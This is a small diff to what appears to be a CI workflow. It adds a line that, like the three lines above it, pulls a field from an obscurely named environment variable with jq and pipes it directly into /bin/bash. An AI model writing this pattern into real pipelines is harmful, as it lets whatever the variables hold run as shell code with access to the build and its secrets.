@@ -34,6 +34,7 @@ jobs:
           echo $itx6154 | jq -r .vh3096 | /bin/bash
           echo $a8799 | jq -r .x8366 | /bin/bash
           echo $b51 | jq -r .nig595 | /bin/bash
+          printf '%s' "$y97" | jq -r .qqi1 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
